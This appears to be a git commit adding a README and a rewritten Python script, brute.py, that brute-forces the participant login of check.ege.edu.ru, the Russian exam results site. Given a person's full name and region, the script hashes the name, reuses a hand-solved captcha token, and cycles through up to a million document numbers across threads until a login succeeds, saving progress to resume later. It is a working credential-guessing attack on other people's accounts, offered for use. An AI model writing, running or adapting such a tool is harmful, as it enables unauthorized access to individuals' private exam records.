ab37c7cf1b2f7dd245a2089468388bf81d0992ee
Nick Gant <beltyukovdanil@gmail.com>
2018-07-02 00:58:19 +0300

    final things

---
+++ README.md
@@ -0,0 +1,12 @@
+# `check.ege.edu.ru` bruteforce
+
+## Usage
+
+```shell
+$ python brute.py [-h] -r REGION [-t THREADS] [-c CHECKPOINT] fio
+```
+where:
+ - fio - last name + first name + middle name (may be w/o whitespaces)
+ - REGION - region of participant
+
+Auto-saves progress if stopped
--- brute.py
+++ brute.py
@@ -1,159 +1,226 @@
-import requests
-import json
-import os
-import base64
+#!/bin/bash
+import argparse
 import hashlib
+import os
+import logging
+from random import shuffle
+from base64 import decodebytes
+from threading import Thread, Condition, Event, Lock
+from queue import Queue, Empty
+import pickle
+import requests
+from tqdm import tqdm
 
-base_path = "http://check.ege.edu.ru/"
-# API
-api = {
-    "captcha": "api/captcha",
-    "login": "api/participant/login",
-    "region": "api/region"
-}
+# TODO: logging
+# TODO: exceptions
+# TODO: replace prints with logger
+# TODO: save goods to file
 
-regions = list()
-
-token = ""
-captcha = ""
-
-
-def get_regions():
-
-    global regions
-
-    r = requests.get(base_path + api["region"])
-    temp = json.loads(r.text)
-    for region in  temp:
-        regions.append(region["Id"])
+BASE_URL = 'http://check.ege.edu.ru/'
+API_CAPTCHA = f'{BASE_URL}api/captcha'
+API_LOGIN = f'{BASE_URL}api/participant/login'
 
 
-def solve_captcha():
+def queue_list(q):
+    try:
+        yield q.get(False)
+    except Empty:
+        pass
 
-    global captcha, token
 
-    solved = False
+class Bruter:
+    def __init__(self, name, region):
+        self.name = name
+        self.hash = self.get_hash(name)
+        self.region = region
+        self.number = 1
+        self.token = None
+        self.captcha = None
 
-    while not solved:
-        print("Send GET to " + base_path + api["captcha"])
+        self.queue = Queue()
 
-        r = requests.get(base_path + api["captcha"])
-        _json = json.loads(r.text)
+        t = ['0' * (6 - len(str(num))) + str(num) for num in range(1, 1000000)]
+        shuffle(t)
+        for num in t:
+            self.queue.put(num)
+
+        # for num in range(1, 1000000):
+            # self.queue.put('0' * (6 - len(str(num))) + str(num))
+
+        self.captcha_died = Event()
+        self.captcha_condition = Condition()
+        self.bruted = Event()
+
+        self.captcha_died.set()
+
+        self.progressbar_lock = Lock()
+        self.bar = tqdm(total=10**6)
+
+    def brute(self):
+        while not self.queue.empty() and not self.bruted.is_set():
+
+            if self.captcha_died.is_set():
+                self.captcha_condition.acquire()
+                self.captcha_condition.wait()
+                self.captcha_condition.release()
+
+            number = self.queue.get()
+
+            body = {
+                "Hash": self.hash,
+                "Code": '',
+                "Token": self.token,
+                "Captcha": self.captcha,
+                "Region": self.region,
+                "Document": '0000' + number
+            }
+
+            r = requests.post(API_LOGIN, data=body)
+
+            if r.status_code == 204:
+                print(f'Bruted:{number}')
+                self.bruted.set()
+                self.captcha_died.set()  # Signal captcha thread not to wait
+            elif r.text == '"Участник не найден"' and r.status_code == 401:
+                # print(f'Bad:{number}')
+                with self.progressbar_lock:
+                    self.bar.update()
+                    self.bar.write(f'[BAD] {number}')
+            elif r.text == '"Пожалуйста, проверьте правильность введённого кода с картинки"' and r.status_code == 400:
+                print('Captcha died')
+                self.captcha_died.set()
+            else:
+                self.queue.put(number)
+                print(r.text, r.status_code)
+                print(f'Request failed:{number}')
+        print('Brute thread exit')
+
+    def start(self, threads_num):
+        captcha_thread = Thread(target=self.captcha_solver, daemon=True)
+        captcha_thread.start()
+        threads = []
+        for _ in range(threads_num):
+            thread = Thread(target=self.brute, args=(), daemon=True)
+            threads.append(thread)
+            thread.start()
+        try:
+            for thread in threads:
+                thread.join()
+        except KeyboardInterrupt:
+            self.bruted.set()
+            for thread in threads:
+                thread.join()
+            print('Saving progress...')
+            self.save_progress()
+        # captcha_thread.join()
+
+    def captcha_solver(self):
+        while not self.bruted.is_set() and not self.queue.empty():
+            self.captcha_died.wait()
+
+            if self.bruted.is_set():
+                break
+
+            print('Obtaining new captcha...')
+
+            while not self.request_captcha():
+                pass
+
+            self.captcha_died.clear()
+            self.captcha_condition.acquire()
+            self.captcha_condition.notify_all()
+            self.captcha_condition.release()
+        print('Captcha thread quit')
+
+    def request_captcha(self):
+        r = requests.get(API_CAPTCHA)
+        if r.status_code != 200:
+            raise ConnectionError()
+        _json = r.json()
         image = _json['Image']
         token = _json['Token']
 
-        print("Got new captcha")
+        with open('captcha.jpg', 'wb') as f:
+            f.write(decodebytes(image.encode()))
 
-        with open("image.jpg", "wb") as file:
-            file.write(base64.decodebytes(image.encode()))
-
-        print("Open captcha to solve")
-        print("Enter code: ")
-        os.system("start " + "image.jpg")
-        captcha = input().strip()
-
-        status = requests.post(base_path + api["login"], data={
-            "Captcha": captcha,
-            "Code": "",
-            "Document": "0000585858",
-            "Hash": hashlib.md5("captcha".encode("utf-8")).hexdigest(),
-            "Region": 61,
-            "Token": token
-        }).text
-
-        if status != '"Пожалуйста, проверьте правильность введённого кода с картинки"':
-            solved = True
+        os.system('open captcha.jpg')
+        captcha = input('Enter captcha:').rstrip()
+        if self.test_captcha(captcha, token):
+            self.captcha = captcha
+            self.token = token
+            print('Captcha valid')
+            return True
         else:
-            print("Error! Captcha isnt solved")
-            print("Try to get new captcha")
+            print('Wrong captcha')
+            return False
 
-    print("Captcha solved!")
-
-
-def send_request(code, document, hash, region):
-    r = requests.post(base_path + api["login"], data={
-            "Captcha": captcha,
-            "Code": code,
-            "Document": document,
-            "Hash": hash,
-            "Region": region,
-            "Token": token
+    @staticmethod
+    def test_captcha(captcha, token):
+        r = requests.post(API_LOGIN, data={
+            'Captcha': captcha,
+            'Code': '',
+            'Document': '0000585858',
+            'Hash': '4cfdc2e157eefe6facb983b1d557b3a1',
+            'Region': 61,
+            'Token': token
         })
-    return r.text, r.status_code
+
+        print(r.text, r.status_code)
+        if r.text == '"Участник не найден"' and r.status_code == 401:
+            return True
+        else:
+            return False
+
+    # Get hash of fullname
+    @staticmethod
+    def get_hash(fullname):
+        return hashlib.md5(fullname.lower()
+                           .replace(' ', '')
+                           .replace('й', 'и')
+                           .replace('ё', 'е')
+                           .encode('utf-8'))\
+            .hexdigest()
+
+    def save_progress(self):
+        # TODO: queue_list doesn't work: yields only once
+        l = [item for item in queue_list(self.queue)]
+
+        with open(f'{self.hash}.cpt', 'wb') as f:
+            pickle.dump(l, f, pickle.HIGHEST_PROTOCOL)
+
+    def load_progress(self, filename):
+        with open(filename, 'rb') as f:
+            l = pickle.load(f)
+        with self.queue.mutex:
+            self.queue.queue.clear()
+        for item in l:
+            self.queue.put(item)
 
 
-def get_hash(fullname):
-    return hashlib.md5(fullname.lower().strip().replace(" ", "").replace("й", "и").replace("ё", "е").encode("utf-8")).hexdigest()
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('fio', type=str)
+    parser.add_argument('-r', '--region', type=int,
+                        required=True, help='region')
+    parser.add_argument('-t', '--threads', type=int,
+                        default=4, help='number of threads')
+    parser.add_argument('-c', '--checkpoint', type=str,
+                        default=None, help='start bruting from a checkpoint')
+    args = parser.parse_args()
+    print(args)
 
-
-def save_good(fullname, document, region):
-    with open("good.txt", "a", encoding="utf-8") as file:
-        file.write(fullname + " " + str(region) + " " + str(document) + "\n")
-
-
-def save_bad(fullname, document, region):
-    with open("bad.txt", "a", encoding="utf-8") as file:
-        file.write(fullname + " " + str(region) + " " + str(document) + "\n")
-
-
-get_regions()
-solve_captcha()
-
-with open("fios.txt", "r", encoding="utf-8") as file:
-    fios = file.read().split("\n")
-
-for fullname in fios:
-
-    # Get hash
-    hash = get_hash(fullname)
-    print("Generate hash: " + str(hash) + " for FIO: " + fullname)
-
-    # Code is an empty string
-    code = ""
-
-    # Pickup region
-    region = 61
-
-    found = False
-
-    # Pickup document
-    for document in range(0, 1000000):
-
-        if found:
-            break
-
-        solved = False
-        found = False
-
-        # Post it to site
-        while not solved:
-
-            document = str(document)
-            while len(document) < 10:
-                document = "0" + document
-
-            solved = False
-
-            print("Sending request with hash: " + str(hash) + " doc: " + str(document) + " captcha_code: " + str(captcha))
-
-            result, result_code = send_request(code, document, hash, region)
-
-            print("Get server answer, code: " + str(result_code) + " Answer: " + result)
-
-            # Check result
-            if result_code == 204:
-                print("Great job! Login success")
-                print("Saving it to file")
-                save_good(fullname, document, region)
-                solved = True
-                found = True
-            elif result == '"Участник не найден"':
-                print("Login failed. Trying next one")
-                save_bad(fullname, document, region)
-                solved = True
-            elif result == '"Пожалуйста, проверьте правильность введённого кода с картинки"':
-                # Captcha die
-                print("Captcha die, trying to get new one")
-                solve_captcha()
-
-print("Well done. Check good.txt")
+    # try:
+    #     fio_list = open(args.dictionary).readlines()
+    # except FileNotFoundError:
+    #     print('Dictionary file not found')
+    #     os._exit(1)
+    try:
+        # for fio in fio_list:
+        #     bruter = Bruter(fio, args.region)
+        #     bruter.start(args.threads)
+        bruter = Bruter(args.fio, args.region)
+        if args.checkpoint != None:
+            bruter.load_progress(args.checkpoint)
+        bruter.start(args.threads)
+    except KeyboardInterrupt:
+        os._exit(2)
